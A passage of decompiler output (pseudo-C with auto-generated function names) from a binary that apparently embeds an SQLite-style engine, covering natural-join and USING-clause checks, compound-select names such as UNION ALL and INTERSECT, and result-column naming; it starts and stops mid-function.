    while ( v5 != v6[1] || sub_100593F9(*(_BYTE **)v4, v5, (unsigned __int8 *)&aNaturaleftoute[*v6]) )
    {
      ++v11;
      v6 += 3;
      if ( (int)v6 >= (int)&unk_100FE5E5 )
        goto LABEL_9;
    }
    v12 |= (unsigned __int8)byte_100FE5D2[3 * v11];
LABEL_9:
    if ( v11 >= 7 )
    {
      v12 |= 0x40u;
      break;
    }
    ++v10;
  }
  while ( v10 < 3 );
  if ( (v12 & 0x21) == 33 || (v12 & 0x40) != 0 )
  {
    v7 = asc_1017F408;
    if ( !a4 )
      v7 = &asc_1017F408[1];
    sub_10059320(a1, aUnknownOrUnsup, a2, a3, v7, a4);
    return 1;
  }
  if ( (v12 & 0x20) != 0 && (v12 & 0x18) != 8 )
  {
    sub_10059320(a1, aRightAndFullOu);
    return 1;
  }
  return v12;
}

//----- (1007B125) --------------------------------------------------------
int __usercall sub_1007B125@<eax>(int a1@<eax>, unsigned __int8 *a2)
{
  int v2; // esi
  int v3; // ebx
  unsigned __int8 **i; // edi

  v2 = *(_DWORD *)(a1 + 12);
  v3 = 0;
  if ( v2 <= 0 )
    return -1;
  for ( i = *(unsigned __int8 ***)(a1 + 16); sub_100593BE(*i, a2); i += 6 )
  {
    if ( ++v3 >= v2 )
      return -1;
  }
  return v3;
}

//----- (1007B159) --------------------------------------------------------
int __usercall sub_1007B159@<eax>(int a1@<eax>, _DWORD *a2@<ebx>, int a3, unsigned __int8 *a4, int *a5)
{
  int v5; // edi
  int *i; // esi
  int v7; // eax

  v5 = 0;
  if ( a3 <= 0 )
    return 0;
  for ( i = (int *)(a1 + 20); ; i += 14 )
  {
    v7 = sub_1007B125(*i, a4);
    if ( v7 >= 0 )
      break;
    if ( ++v5 >= a3 )
      return 0;
  }
  if ( a2 )
  {
    *a2 = v5;
    *a5 = v7;
  }
  return 1;
}

//----- (1007B198) --------------------------------------------------------
_DWORD *__usercall sub_1007B198@<eax>(
        int a1@<eax>,
        int a2@<edx>,
        int *a3@<ecx>,
        int a4,
        int a5,
        int a6,
        int a7,
        unsigned int *a8)
{
  int v9; // edi
  _DWORD *v10; // edi
  _DWORD *v11; // eax
  _DWORD *result; // eax
  int v13; // [esp+Ch] [ebp-8h]
  _DWORD *v14; // [esp+10h] [ebp-4h]

  v9 = *a3;
  v13 = *a3;
  v14 = sub_1007F6B7(a1, a2, *a3, a4);
  v10 = sub_1007F6B7(a5, a6, v9, a4);
  v11 = sub_10075DC6(0, (unsigned int)v10, a3, 76, (unsigned int)v14);
  if ( v11 && a7 )
  {
    *((_WORD *)v11 + 1) |= 1u;
    *((_WORD *)v11 + 16) = *((_WORD *)v10 + 12);
  }
  result = sub_10075DEF(v11, v13, *a8);
  *a8 = (unsigned int)result;
  return result;
}

//----- (1007B202) --------------------------------------------------------
int __cdecl sub_1007B202(int a1, int a2)
{
  int i; // esi
  int result; // eax
  int v4; // [esp-Ch] [ebp-10h]

  for ( i = a1; i; i = *(_DWORD *)(i + 12) )
  {
    *(_WORD *)(i + 2) |= 1u;
    v4 = *(_DWORD *)(i + 8);
    *(_WORD *)(i + 32) = a2;
    result = sub_1007B202(v4, a2);
  }
  return result;
}

//----- (1007B230) --------------------------------------------------------
int __cdecl sub_1007B230(int *a1, int a2)
{
  __int16 *v2; // ebx
  bool v3; // cc
  int *v4; // esi
  bool v5; // zf
  int v6; // edi
  unsigned __int8 v7; // al
  int v8; // edi
  _DWORD *v9; // edi
  int v10; // eax
  unsigned __int8 *v12; // [esp+10h] [ebp-30h]
  int v13; // [esp+14h] [ebp-2Ch] BYREF
  int v14; // [esp+18h] [ebp-28h] BYREF
  int v15; // [esp+1Ch] [ebp-24h] BYREF
  int v16; // [esp+20h] [ebp-20h] BYREF
  _DWORD *v17; // [esp+24h] [ebp-1Ch]
  int v18; // [esp+28h] [ebp-18h]
  int v19; // [esp+2Ch] [ebp-14h]
  int v20; // [esp+30h] [ebp-10h]
  int v21; // [esp+34h] [ebp-Ch]
  __int16 *v22; // [esp+38h] [ebp-8h]
  int v23; // [esp+3Ch] [ebp-4h]

  v2 = *(__int16 **)(a2 + 8);
  v3 = *v2 - 1 <= 0;
  v22 = v2;
  v21 = 0;
  if ( v3 )
    return 0;
  v4 = (int *)(v2 + 46);
  v17 = v2 + 10;
  while ( 1 )
  {
    v5 = *v17 == 0;
    v6 = *(v4 - 4);
    v19 = v6;
    if ( !v5 )
    {
      if ( v6 )
      {
        v7 = *((_BYTE *)v4 - 7);
        v18 = (v7 >> 5) & 1;
        if ( (v7 & 4) != 0 )
        {
          if ( *v4 || v4[1] )
          {
            sub_10059320(a1, aANaturalJoinMa);
            return 1;
          }
          v3 = *(_DWORD *)(v6 + 12) <= 0;
          v23 = 0;
          if ( !v3 )
          {
            v8 = v21 + 1;
            v20 = 0;
            do
            {
              if ( sub_1007B159((int)v22, &v15, v8, *(unsigned __int8 **)(*(_DWORD *)(v19 + 16) + v20), &v16) )
                sub_1007B198(v15, v16, a1, (int)v22, v8, v23, v18, (unsigned int *)(a2 + 12));
              ++v23;
              v20 += 24;
            }
            while ( v23 < *(_DWORD *)(v19 + 12) );
            v2 = v22;
          }
        }
        if ( *v4 )
        {
          if ( v4[1] )
          {
            sub_10059320(a1, aCannotHaveBoth);
            return 1;
          }
          if ( v18 )
            sub_1007B202(*v4, *(v4 - 1));
          *(_DWORD *)(a2 + 12) = sub_10075DEF((_DWORD *)*v4, *a1, *(_DWORD *)(a2 + 12));
          *v4 = 0;
        }
        v9 = (_DWORD *)v4[1];
        if ( v9 )
        {
          v3 = v9[1] <= 0;
          v23 = 0;
          if ( !v3 )
            break;
        }
      }
    }
LABEL_25:
    v10 = *v2;
    ++v21;
    v17 += 14;
    v4 += 14;
    if ( v21 >= v10 - 1 )
      return 0;
  }
  while ( 1 )
  {
    v12 = *(unsigned __int8 **)(*v9 + 8 * v23);
    v20 = sub_1007B125(v19, v12);
    if ( v20 < 0 || !sub_1007B159((int)v22, &v13, v21 + 1, v12, &v14) )
      break;
    sub_1007B198(v13, v14, a1, (int)v22, v21 + 1, v20, v18, (unsigned int *)(a2 + 12));
    if ( ++v23 >= v9[1] )
    {
      v2 = v22;
      goto LABEL_25;
    }
  }
  sub_10059320(a1, aCannotJoinUsin);
  return 1;
}

//----- (1007B40F) --------------------------------------------------------
int __cdecl sub_1007B40F(_DWORD *a1, int *a2, int a3, int a4)
{
  int v4; // edi
  int v5; // esi
  int v6; // ecx
  int v7; // edi
  int v9; // eax
  int result; // eax
  int v11; // ecx
  int v12; // [esp+Ch] [ebp-Ch]
  int v13; // [esp+10h] [ebp-8h]
  int v14; // [esp+14h] [ebp-4h]
  int v15; // [esp+20h] [ebp+8h]
  int v16; // [esp+20h] [ebp+8h]
  int v17; // [esp+24h] [ebp+Ch]

  v4 = *a2;
  v14 = a1[3];
  v12 = *a2 + 2;
  v5 = sub_10078AA4(a1, v12);
  v13 = sub_10078A55(v6);
  sub_100773BA((int)a1);
  sub_10078052(a2, (int)a1, v5, 0);
  v7 = v5 + v4;
  sub_1005ABE8(v14, 52, a2[2], v7);
  sub_100773D8((int)a1, 1, a4, v7 + 1);
  sub_1005AB66(v14, 30, v5, v12, v13);
  sub_1005ABE8(v14, 67, a2[2], v13);
  v9 = sub_10078A70((int)a1, v13);
  sub_10078AC8(v9, v5, v12);
  result = *(_DWORD *)(a3 + 48);
  if ( result )
  {
    v11 = *(_DWORD *)(a3 + 52);
    if ( v11 )
      v15 = v11 + 1;
    else
      v15 = *(_DWORD *)(a3 + 48);
    v17 = sub_1005ABD1(v14, 114, v15);
    sub_1005ABE8(v14, 20, v15, -1);
    v16 = sub_1005ABB9(v14, 1);
    sub_1005AE20(v17, v14);
    sub_1005ABD1(v14, 62, a2[2]);
    sub_1005ABD1(v14, 56, a2[2]);
    result = sub_1005AE20(v16, v14);
    *(_DWORD *)(a3 + 48) = 0;
  }
  return result;
}
// 1007B435: variable 'v6' is possibly undefined

//----- (1007B530) --------------------------------------------------------
int __usercall sub_1007B530@<eax>(int a1@<eax>, int a2@<edi>, int a3)
{
  int result; // eax
  int v5; // esi

  result = *(_DWORD *)(a1 + 52);
  if ( result )
  {
    if ( a3 )
    {
      sub_1005ABE8(a2, 20, result, -1);
      v5 = sub_1005ABD1(a2, 113, *(_DWORD *)(a1 + 52));
      sub_1005ABE8(a2, 1, 0, a3);
      return sub_1005AE20(v5, a2);
    }
  }
  return result;
}

//----- (1007B57F) --------------------------------------------------------
int __usercall sub_1007B57F@<eax>(int a1@<edi>, int a2, int a3, unsigned __int16 *a4, int a5)
{
  int *v5; // esi
  int v6; // ebx

  v5 = *(int **)(a1 + 12);
  v6 = sub_10078A55(a1);
  sub_1005AC32(v5, 49, a2, a3, a5, a4);
  sub_1005AB66((int)v5, 30, a5, (int)a4, v6);
  sub_1005ABE8((int)v5, 67, a2, v6);
  return sub_10078A70(a1, v6);
}

//----- (1007B5D0) --------------------------------------------------------
int __usercall sub_1007B5D0@<eax>(int a1@<ecx>, int *a2@<edi>, int a3)
{
  if ( a3 != 6 && a3 != 7 )
    return 0;
  sub_10059320(a2, aOnlyASingleRes, a1);
  return 1;
}

//----- (1007B5F5) --------------------------------------------------------
int __usercall sub_1007B5F5@<eax>(
        unsigned __int8 *a1@<eax>,
        int *a2,
        int a3,
        int a4,
        int a5,
        int a6,
        int *a7,
        int a8,
        int a9,
        int a10)
{
  int v11; // edi
  int result; // eax
  int v13; // edi
  int v14; // ebx
  int v15; // edi
  unsigned __int16 *v16; // edx
  int v17; // eax
  int v18; // [esp+14h] [ebp-18h]
  int i; // [esp+1Ch] [ebp-10h]
  int v20; // [esp+20h] [ebp-Ch]
  int v21; // [esp+24h] [ebp-8h]
  int *v22; // [esp+28h] [ebp-4h]

  v18 = *a1;
  v11 = a2[3];
  v20 = *((_DWORD *)a1 + 1);
  result = 0;
  v22 = (int *)v11;
  if ( v11 )
  {
    if ( !a7 && a8 < 0 )
      sub_1007B530(a3, v11, a9);
    if ( a6 <= 0 )
      v21 = *(_DWORD *)a4;
    else
      v21 = a6;
    if ( !*((_DWORD *)a1 + 2) )
    {
      *((_DWORD *)a1 + 2) = a2[18] + 1;
      *((_DWORD *)a1 + 3) = v21;
      a2[18] += v21;
    }
    v13 = *((_DWORD *)a1 + 2);
    if ( a6 <= 0 )
    {
      if ( v18 != 3 )
      {
        sub_100773BA((int)a2);
        sub_10078052((int *)a4, (int)a2, v13, v18 == 5);
      }
    }
    else
    {
      for ( i = 0; i < a6; ++i )
        sub_1005AB66((int)v22, 28, a5, i, i + v13);
    }
    if ( a8 >= 0 )
    {
      sub_1007B57F((int)a2, a8, a9, (unsigned __int16 *)v21, v13);
      if ( !a7 )
        sub_1007B530(a3, (int)v22, a9);
    }
    if ( *(int *)a4 <= 1 )
      result = 0;
    else
      result = sub_1007B5D0(a4, a2, *a1);
    if ( !result )
    {
      switch ( v18 )
      {
        case 1:
          v14 = sub_10078A55((int)a2);
          sub_1005AB66((int)v22, 30, v13, v21, v14);
          sub_1005ABE8((int)v22, 67, v20, v14);
          goto LABEL_37;
        case 2:
          sub_1005AB66((int)v22, 70, v20, v13, v21);
          goto LABEL_42;
        case 3:
          sub_1005ABE8((int)v22, 7, 1, v20);
          goto LABEL_42;
        case 5:
        case 10:
          if ( !a7 )
          {
            if ( v18 == 10 )
            {
              sub_1005ABD1((int)v22, 4, *((_DWORD *)a1 + 1));
            }
            else
            {
              sub_1005ABE8((int)v22, 16, v13, v21);
              sub_100772A8((int)a2, v21, v13);
            }
            goto LABEL_42;
          }
          v14 = sub_10078A55((int)a2);
          sub_1005AB66((int)v22, 30, v13, v21, v14);
          sub_1007B40F(a2, a7, a3, v14);
LABEL_37:
          v17 = (int)a2;
          goto LABEL_38;
        case 6:
          if ( a7 )
            goto LABEL_30;
          sub_100773D8((int)a2, 1, v13, v20);
          goto LABEL_42;
        case 7:
          *(_BYTE *)(a3 + 5) = sub_10075A35(**(unsigned __int8 ***)(a4 + 12), a1[1]);
          if ( a7 )
          {
LABEL_30:
            sub_1007B40F(a2, a7, a3, v13);
          }
          else
          {
            v14 = sub_10078A55((int)a2);
            sub_1005AC02(v22, 30, v13, 1, v14, v16, (_BYTE *)1);
            sub_100772A8((int)a2, 1, v13);
            sub_1005ABE8((int)v22, 67, v20, v14);
            v17 = (int)a2;
LABEL_38:
            sub_10078A70(v17, v14);
          }
LABEL_42:
          result = *(_DWORD *)(a3 + 48);
          if ( result )
            result = sub_1005AB66((int)v22, 114, result, a10, -1);
          break;
        case 8:
        case 9:
          v14 = sub_10078A55((int)a2);
          sub_1005AB66((int)v22, 30, v13, v21, v14);
          if ( a7 )
          {
            sub_1007B40F(a2, a7, a3, v14);
          }
          else
          {
            v15 = sub_10078A55((int)a2);
            sub_1005ABE8((int)v22, 53, v20, v15);
            sub_1005AB66((int)v22, 54, v20, v14, v15);
            sub_1005AE0E((int)v22, 8);
            sub_10078A70((int)a2, v15);
          }
          goto LABEL_37;
        default:
          goto LABEL_42;
      }
    }
  }
  return result;
}
// 1007B679: conditional instruction was optimized away because eax.4>=1
// 1007B835: variable 'v16' is possibly undefined

//----- (1007B93D) --------------------------------------------------------
_DWORD *__cdecl sub_1007B93D(int *a1, int *a2)
{
  int v2; // ebx
  int v3; // edi
  _DWORD *v4; // eax
  _DWORD *v5; // esi
  int *v6; // eax
  int **v7; // ecx
  int v8; // edx
  int **v10; // [esp+10h] [ebp-8h]
  int v11; // [esp+14h] [ebp-4h]
  int v12; // [esp+24h] [ebp+Ch]

  v2 = *a1;
  v3 = *a2;
  v4 = sub_1005904B(*a1, 5 * *a2 + 16);
  v5 = v4;
  if ( v4 )
  {
    v11 = 0;
    v4[2] = &v4[v3 + 3];
    *((_WORD *)v4 + 3) = v3;
    *((_BYTE *)v4 + 4) = *(_BYTE *)(*(_DWORD *)(*(_DWORD *)(v2 + 8) + 12) + 73);
    *v4 = v2;
    v12 = a2[3];
    if ( v3 > 0 )
    {
      v10 = (int **)(v4 + 3);
      do
      {
        v6 = sub_1007596F(*(unsigned __int8 **)v12, a1);
        if ( !v6 )
          v6 = *(int **)(v2 + 44);
        v7 = v10;
        v8 = v11++;
        ++v10;
        *v7 = v6;
        LOBYTE(v7) = *(_BYTE *)(v12 + 12);
        v12 += 20;
        *(_BYTE *)(v8 + v5[2]) = (_BYTE)v7;
      }
      while ( v11 < v3 );
    }
  }
  return v5;
}

//----- (1007B9D6) --------------------------------------------------------
_DWORD *__cdecl sub_1007B9D6(int a1, int a2, int *a3, int a4, unsigned __int8 *a5)
{
  int v5; // esi
  _DWORD *v6; // ebx
  int v7; // edx
  int v8; // ebx
  unsigned __int8 *v9; // edi
  int v10; // eax
  _DWORD *result; // eax
  int v12; // [esp+10h] [ebp-24h]
  int v13; // [esp+14h] [ebp-20h]
  int v14; // [esp+18h] [ebp-1Ch]
  int v15; // [esp+1Ch] [ebp-18h]
  int v16; // [esp+20h] [ebp-14h]
  int v17; // [esp+24h] [ebp-10h]
  int v18; // [esp+28h] [ebp-Ch]
  int v19; // [esp+2Ch] [ebp-8h]
  int v20; // [esp+30h] [ebp-4h]

  v5 = (int)a3;
  v13 = sub_1005AC63((int)a3);
  v15 = 0;
  v14 = sub_1005AC63((int)a3);
  v6 = *(_DWORD **)(a2 + 24);
  v19 = *((_DWORD *)a5 + 1);
  v16 = v6[2];
  v17 = *a5;
  v18 = sub_10078A55(a1);
  if ( v7 == 5 || v7 == 10 )
  {
    v15 = *(_DWORD *)(a1 + 68);
    *(_DWORD *)(a1 + 68) = v15 + 1;
    sub_1005AB66((int)a3, 41, v15, v18, a4);
    v20 = 0;
  }
  else
  {
    v20 = sub_10078A55(a1);
  }
  v12 = sub_1005ABE8((int)a3, 63, v16, v13) + 1;
  sub_1007B530(a2, (int)a3, v14);
  sub_1005AB66((int)a3, 28, v16, *v6 + 1, v18);
  if ( v17 == 6 )
  {
    sub_100773D8(a1, 1, v18, v19);
    goto LABEL_22;
  }
  if ( v17 == 7 )
  {
    sub_1005AC02(a3, 30, v18, 1, v20, (unsigned __int16 *)(a2 + 5), (_BYTE *)1);
    sub_100772A8(a1, 1, v18);
    sub_1005ABE8((int)a3, 67, v19, v20);
    goto LABEL_20;
  }
  if ( v17 <= 7 || v17 > 9 )
  {
    v8 = 0;
    if ( a4 <= 0 )
    {
      v9 = a5;
    }
    else
    {
      do
      {
        v9 = a5;
        sub_1005AB66((int)a3, 28, v15, v8, v8 + *((_DWORD *)a5 + 2));
        if ( !v8 )
          sub_1005AE0E((int)a3, 32);
        ++v8;
      }
      while ( v8 < a4 );
    }
    if ( v17 != 5 )
    {
      sub_1005ABD1((int)a3, 4, *((_DWORD *)v9 + 1));
      goto LABEL_22;
    }
    sub_1005ABE8((int)a3, 16, *((_DWORD *)v9 + 2), a4);
    sub_100772A8(a1, a4, *((_DWORD *)v9 + 2));
LABEL_20:
    v5 = (int)a3;
    goto LABEL_22;
  }
  sub_1005ABE8((int)a3, 53, v19, v20);
  sub_1005AB66((int)a3, 54, v19, v18, v20);
  sub_1005AE0E((int)a3, 8);
LABEL_22:
  v10 = sub_10078A70(a1, v18);
  sub_10078A70(v10, v20);
  sub_1005ACAF(v5, v14);
  sub_1005ABE8(v5, 66, v16, v12);
  result = sub_1005ACAF(v5, v13);
  if ( v17 == 5 || v17 == 10 )
    return (_DWORD *)sub_1005ABE8(v5, 42, v15, 0);
  return result;
}
// 1007BA25: variable 'v7' is possibly undefined

//----- (1007BBFB) --------------------------------------------------------
char *__cdecl sub_1007BBFB(int *a1, unsigned __int8 *a2, _DWORD *a3, _DWORD *a4, char **a5)
{
  int v5; // ecx
  int v6; // eax
  _DWORD *v7; // edx
  _DWORD *v8; // esi
  __int16 *v9; // edi
  int v10; // ebx
  int v11; // esi
  _DWORD *v12; // edi
  int v13; // esi
  int v14; // eax
  int v15; // edx
  char *v16; // eax
  char **v17; // eax
  char *v18; // esi
  char *v19; // eax
  int *v20; // ecx
  int v21; // edi
  _DWORD *v22; // eax
  int v23; // edx
  int *v25; // [esp+4h] [ebp-40h] BYREF
  int v26; // [esp+8h] [ebp-3Ch]
  int *v27; // [esp+24h] [ebp-20h]
  int v28; // [esp+28h] [ebp-1Ch]
  _DWORD *v29; // [esp+2Ch] [ebp-18h]
  int v30; // [esp+30h] [ebp-14h]
  int v31; // [esp+34h] [ebp-10h] BYREF
  int v32; // [esp+38h] [ebp-Ch] BYREF
  char *v33; // [esp+3Ch] [ebp-8h]
  char *v34; // [esp+40h] [ebp-4h] BYREF

  v33 = 0;
  v32 = 0;
  v31 = 0;
  v34 = 0;
  if ( !a2 )
    return 0;
  v5 = (int)a1;
  if ( !a1[1] )
    return 0;
  if ( *a2 == 116 )
  {
    v22 = (_DWORD *)*((_DWORD *)a2 + 4);
    v23 = **(_DWORD **)(*v22 + 12);
    v26 = v22[2];
    v25 = (int *)*a1;
    v27 = a1;
    v16 = (char *)sub_1007BBFB(&v25, v23, &v32, &v31, &v34);
    goto LABEL_29;
  }
  if ( *a2 == 152 || *a2 == 154 )
  {
    v6 = *((__int16 *)a2 + 14);
    v7 = 0;
    v8 = 0;
    v29 = 0;
    while ( !v7 )
    {
      v9 = *(__int16 **)(v5 + 4);
      v10 = *v9;
      v11 = 0;
      v30 = v10;
      if ( v10 > 0 )
      {
        v28 = *((_DWORD *)a2 + 6);
        v12 = v9 + 16;
        do
        {
          if ( *v12 == v28 )
            break;
          ++v11;
          v12 += 14;
        }
        while ( v11 < v30 );
      }
      if ( v11 >= v30 )
      {
        v5 = *(_DWORD *)(v5 + 32);
        v8 = v29;
      }
      else
      {
        v13 = *(_DWORD *)(v5 + 4) + 56 * v11;
        v7 = *(_DWORD **)(v13 + 20);
        v8 = *(_DWORD **)(v13 + 24);
        v29 = v8;
      }
      if ( !v5 )
      {
        if ( !v7 )
          goto LABEL_30;
        break;
      }
    }
    if ( !v8 )
    {
      if ( v7[17] )
      {
        if ( v6 >= 0 || (v6 = v7[2], v6 >= 0) )
        {
          v17 = (char **)(v7[4] + 24 * v6);
          v18 = v17[3];
          v19 = *v17;
          v33 = v18;
          v34 = v19;
        }
        else
        {
          v33 = aInteger_1;
          v34 = aRowid_1;
        }
        v31 = v7[1];
        v20 = *(int **)v5;
        if ( v20 )
        {
          v21 = *v20;
          v32 = *(_DWORD *)(16 * sub_1005855F(*v20, v7[17]) + *(_DWORD *)(v21 + 8));
        }
      }
      goto LABEL_30;
    }
    if ( v6 >= 0 && v6 < *(_DWORD *)*v8 )
    {
      v14 = *(_DWORD *)(20 * v6 + *(_DWORD *)(*v8 + 12));
      v15 = v8[2];
      v27 = (int *)v5;
      v25 = *(int **)v5;
      v26 = v15;
      v16 = (char *)sub_1007BBFB(&v25, v14, &v32, &v31, &v34);
LABEL_29:
      v33 = v16;
    }
  }
LABEL_30:
  if ( a3 )
  {
    *a3 = v32;
    *a4 = v31;
    *a5 = v34;
  }
  return v33;
}

//----- (1007BDA0) --------------------------------------------------------
int __usercall sub_1007BDA0@<eax>(int result@<eax>, int *a2@<esi>, int a3)
{
  int v3; // ebx
  int v4; // edi
  bool v5; // cc
  char *v6; // eax
  int v7[9]; // [esp+Ch] [ebp-28h] BYREF
  int v8; // [esp+30h] [ebp-4h]

  v8 = *(_DWORD *)(result + 12);
  v3 = 0;
  v4 = 0;
  v5 = *a2 <= 0;
  v7[1] = a3;
  v7[0] = result;
  if ( !v5 )
  {
    do
    {
      v6 = sub_1007BBFB(v7, *(unsigned __int8 **)(v3 + a2[3]), 0, 0, 0);
      result = sub_1005B518(v8, v4++, 1, v6, (void (__cdecl *)(int, unsigned int))0xFFFFFFFF);
      v3 += 20;
    }
    while ( v4 < *a2 );
  }
  return result;
}

//----- (1007BDF4) --------------------------------------------------------
int __cdecl sub_1007BDF4(int a1, __int16 *a2, int *a3)
{
  int result; // eax
  int v4; // ecx
  int v5; // esi
  unsigned int v6; // ecx
  int *v7; // esi
  int *v8; // esi
  int v9; // edx
  char *v10; // eax
  int v11; // eax
  int v12; // ecx
  _DWORD *v13; // edi
  int v14; // ecx
  _BYTE *v15; // eax
  _BYTE *v16; // eax
  int v17; // [esp+10h] [ebp-1Ch]
  int v18; // [esp+18h] [ebp-14h]
  int v19; // [esp+1Ch] [ebp-10h]
  int v20; // [esp+20h] [ebp-Ch]
  int v21; // [esp+24h] [ebp-8h]
  int v22; // [esp+28h] [ebp-4h]

  result = a1;
  v4 = *(_DWORD *)a1;
  v5 = *(_DWORD *)(a1 + 12);
  v21 = v5;
  v20 = *(_DWORD *)a1;
  if ( !*(_BYTE *)(a1 + 16) && v5 && !*(_BYTE *)(v4 + 30) )
  {
    *(_BYTE *)(a1 + 16) = 1;
    v6 = *(_DWORD *)(v4 + 12);
    v17 = (v6 >> 11) & 1;
    v18 = (v6 >> 10) & 1;
    sub_1005B4BC(*a3, v5);
    v7 = a3;
    v22 = 0;
    if ( *a3 > 0 )
    {
      v19 = 0;
      do
      {
        v8 = (int *)(v19 + v7[3]);
        v9 = *v8;
        if ( *v8 )
        {
          v10 = (char *)v8[1];
          if ( !v10 )
          {
            if ( *(_BYTE *)v9 != 0x98 && *(_BYTE *)v9 != 0x9A || !a2 )
              goto LABEL_22;
            v11 = *(__int16 *)(v9 + 28);
            v12 = 0;
            if ( *a2 > 0 )
            {
              v13 = a2 + 16;
              do
              {
                if ( *v13 == *(_DWORD *)(v9 + 24) )
                  break;
                ++v12;
                v13 += 14;
              }
              while ( v12 < *a2 );
            }
            v14 = *(_DWORD *)&a2[28 * v12 + 10];
            if ( v11 >= 0 || (v11 = *(_DWORD *)(v14 + 8), v11 >= 0) )
              v10 = *(char **)(24 * v11 + *(_DWORD *)(v14 + 16));
            else
              v10 = aRowid_2;
            if ( !v17 )
            {
              if ( v18 )
                goto LABEL_27;
LABEL_22:
              v15 = sub_10059194((_BYTE *)v8[2]);
              sub_1005B518(v21, v22, 0, v15, sub_10058EC7);
              goto LABEL_23;
            }
            if ( v18 )
            {
LABEL_27:
              v16 = (_BYTE *)sub_10055484(v20, "%s.%s", *(const char **)(v14 + 4), v10);
              sub_1005B518(v21, v22, 0, v16, sub_10058EC7);
              goto LABEL_23;
            }
          }
          sub_1005B518(v21, v22, 0, v10, (void (__cdecl *)(int, unsigned int))0xFFFFFFFF);
        }
LABEL_23:
        ++v22;
        v7 = a3;
        v19 += 20;
      }
      while ( v22 < *a3 );
    }
    return sub_1007BDA0(a1, v7, (int)a2);
  }
  return result;
}

//----- (1007BF54) --------------------------------------------------------
char *__usercall sub_1007BF54@<eax>(int a1@<eax>)
{
  int v1; // eax
  int v2; // eax

  v1 = a1 - 113;
  if ( !v1 )
    return aUnionAll;
  v2 = v1 - 1;
  if ( !v2 )
    return aExcept;
  if ( v2 == 1 )
    return aIntersect;
  return aUnion;
}

//----- (1007BF77) --------------------------------------------------------
int __usercall sub_1007BF77@<eax>(int *a1@<eax>, int *a2, int *a3, char ***a4)
{
  int *v4; // ebx
  int v5; // esi
  int v6; // edi
  char **v7; // eax
  int v9; // edi
  int *v10; // eax
  int v11; // ecx
  _BYTE *v12; // eax
  char *v13; // eax
  int j; // eax
  char *v15; // edi
  _BYTE *v16; // ebx
  int v17; // eax
  char **v18; // eax
  int v19; // ebx
  unsigned int *v20; // edi
  int v21; // [esp+10h] [ebp-1Ch]
  unsigned int v22; // [esp+14h] [ebp-18h]
  char **v23; // [esp+18h] [ebp-14h]
  int i; // [esp+1Ch] [ebp-10h]
  int v25; // [esp+20h] [ebp-Ch]
  int v26; // [esp+20h] [ebp-Ch]
  int v27; // [esp+24h] [ebp-8h]
  int v28; // [esp+28h] [ebp-4h]

  v4 = a2;
  v5 = *a1;
  v6 = *a2;
  *a3 = *a2;
  v21 = v6;
  v7 = (char **)sub_1005904B(v5, 24 * v6);
  v22 = (unsigned int)v7;
  *a4 = v7;
  if ( !v7 )
    return 7;
  v28 = 0;
  v23 = v7;
  if ( v6 > 0 )
  {
    v9 = 0;
    for ( i = 0; ; v9 = i )
    {
      v10 = (int *)(v9 + v4[3]);
      v11 = *v10;
      v12 = (_BYTE *)v10[1];
      if ( v12 )
      {
        v13 = (char *)sub_10059194(v12);
      }
      else
      {
        for ( j = v11; *(_BYTE *)j == 118; j = *(_DWORD *)(j + 12) )
          ;
        if ( *(_BYTE *)j == 0x98 && *(_DWORD *)(j + 40) )
          v13 = (char *)sub_10055484(v5, aS_11);
        else
          v13 = (char *)(*(_BYTE *)j == 26 ? sub_10055484(v5, aS_12) : sub_10055484(v5, aS_13));
      }
      v15 = v13;
      if ( *(_BYTE *)(v5 + 30) )
        break;
      v16 = sub_10059297(v13);
      v27 = 0;
      v25 = 0;
      if ( v28 > 0 )
      {
        do
        {
          if ( sub_100593BE(*(unsigned __int8 **)(24 * v25 + v22), (unsigned __int8 *)v15) )
          {
            v17 = v25;
          }
          else
          {
            ++v27;
            v15[(_DWORD)v16] = 0;
            v26 = sub_10055484(v5, "%s:%d", v15, v27);
            sub_10058EC7(v5, (unsigned int)v15);
            v15 = (char *)v26;
            v17 = -1;
            if ( !v26 )
              break;
          }
          v25 = v17 + 1;
        }
        while ( v17 + 1 < v28 );
      }
      v18 = v23;
      ++v28;
      i += 20;
      v23 += 6;
      *v18 = v15;
      if ( v28 >= v21 )
        goto LABEL_26;
      v4 = a2;
    }
    sub_10058EC7(v5, (unsigned int)v13);
  }
LABEL_26:
  if ( *(_BYTE *)(v5 + 30) )
  {
    v19 = v28;
    if ( v28 > 0 )
    {
      v20 = (unsigned int *)v22;
      do
      {
        sub_10058EC7(v5, *v20);
        v20 += 6;
        --v19;
      }
      while ( v19 );
    }
    sub_10058EC7(v5, v22);
    *a4 = 0;
    *a3 = 0;
    return 7;
  }
  return 0;
}

//----- (1007C129) --------------------------------------------------------
int *__usercall sub_1007C129@<eax>(_DWORD *a1@<eax>, int a2@<ecx>, int *a3, int a4)
{
  int *result; // eax
  char *v7; // esi
  unsigned __int8 *v8; // edi
  char *v9; // eax
  char v10; // al
  int v11[9]; // [esp+Ch] [ebp-2Ch] BYREF
  int v12; // [esp+30h] [ebp-8h]
  unsigned __int8 **v13; // [esp+34h] [ebp-4h]

  result = a3;
  if ( !*(_BYTE *)(*a3 + 30) )
  {
    memset(v11, 0, sizeof(v11));
    v11[1] = a1[2];
    result = *(int **)(*a1 + 12);
    if ( a2 > 0 )
    {
      v7 = (char *)(a4 + 22);
      v13 = (unsigned __int8 **)result;
      v12 = a2;
      do
      {
        v8 = *v13;
        v9 = sub_1007BBFB(v11, *v13, 0, 0, 0);
        *(_DWORD *)(v7 - 10) = sub_10059194(v9);
        v10 = sub_100758D6(v8);
        *v7 = v10;
        if ( !v10 )
          *v7 = 98;
        result = sub_1007596F(v8, a3);
        if ( result )
        {
          result = sub_10059194((_BYTE *)*result);
          *(_DWORD *)(v7 - 6) = result;
        }
        v13 += 5;
        v7 += 24;
        --v12;
      }
      while ( v12 );
    }
  }
  return result;
}

//----- (1007C1CE) --------------------------------------------------------
_DWORD *__cdecl sub_1007C1CE(int *a1, int a2)
{
  int v2; // ebx
  int v3; // edi
  _DWORD *v5; // eax
  _DWORD *v6; // esi
  int v7; // [esp+Ch] [ebp-4h]

  v2 = a2;
  v3 = *a1;
  v7 = *(_DWORD *)(*a1 + 12);
  *(_DWORD *)(*a1 + 12) = v7 & 0xFFFFF3FF | 0x800;
  sub_1007E178(a1, a2, 0);
  if ( a1[16] )
    return 0;
  while ( *(_DWORD *)(v2 + 28) )
    v2 = *(_DWORD *)(v2 + 28);
  *(_DWORD *)(v3 + 12) = v7;
  v5 = sub_1005904B(v3, 0x4Cu);
  v6 = v5;
  if ( !v5 )
    return 0;
  *v5 = 0;
  v5[1] = 0;
  *((_WORD *)v5 + 16) = 1;
